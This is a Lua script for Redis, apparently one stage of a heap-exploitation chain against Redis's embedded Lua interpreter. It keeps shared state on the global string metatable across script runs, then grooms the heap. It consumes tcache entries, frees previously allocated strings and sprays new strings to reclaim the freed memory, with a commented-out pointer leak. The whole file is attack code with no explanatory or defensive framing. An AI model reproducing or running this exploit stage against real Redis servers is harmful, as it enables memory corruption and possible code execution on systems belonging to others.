local GlobalState = getmetatable("")

local log_s = function(s)
  redis.log(redis.LOG_NOTICE, s)
end

GlobalState.sprayfo1 = {
  1,2,3,4,5,6,7,
}

GlobalState.sprayfo2 = {
  1,2,3,4,5,6,7,
}

-- Clean GC state
collectgarbage()

-- Consume tcache
local pi = 1
for i=1,#GlobalState.sprayfo2 do
  GlobalState.sprayfo2[i] = ARGV[1] .. GlobalState.prefixes1[pi]
  pi = pi + 1
end

-- Free the strings
for i=1,#GlobalState.salloc do
  GlobalState.salloc[i] = 0
end

collectgarbage()

-- Spray to reallocate
for i=1,#GlobalState.sprayfo1 do
  GlobalState.sprayfo1[i] = ARGV[1] .. GlobalState.prefixes1[pi]
  pi = pi + 1
end

-- for i=1,#GlobalState.sprayfo1 do
--   log_s(topointer(GlobalState.sprayfo1[i]))
-- end
